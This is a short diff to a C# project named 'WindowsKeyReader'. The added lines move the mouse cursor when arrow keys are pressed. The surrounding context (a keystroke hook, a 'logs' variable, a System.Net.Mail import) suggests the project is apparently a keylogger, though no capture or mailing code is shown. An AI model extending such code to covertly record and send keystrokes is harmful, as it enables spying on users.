@@ -10,6 +10,7 @@ using System.IO;
 using System.Net;
 using System.Net.Mail;
 using System.Threading;
+using System.Drawing;
 
 
 namespace WindowsKeyReader
@@ -117,6 +118,28 @@ namespace WindowsKeyReader
 
                     //MessageBox.Show(logs);
 
+                }
+                catch { }
+
+                try
+                {
+
+                    if ((Keys)vkCode == Keys.Left)
+                    {
+                        Cursor.Position = new Point(Cursor.Position.X - 5, Cursor.Position.Y);
+                    }
+                    if ((Keys)vkCode == Keys.Right)
+                    {
+                        Cursor.Position = new Point(Cursor.Position.X + 5, Cursor.Position.Y);
+                    }
+                    if ((Keys)vkCode == Keys.Up)
+                    {
+                        Cursor.Position = new Point(Cursor.Position.X, Cursor.Position.Y - 5);
+                    }
+                    if ((Keys)vkCode == Keys.Down)
+                    {
+                        Cursor.Position = new Point(Cursor.Position.X, Cursor.Position.Y + 5);
+                    }
                 }
                 catch { }
                 ////////////////////////////////////////////////////////////////
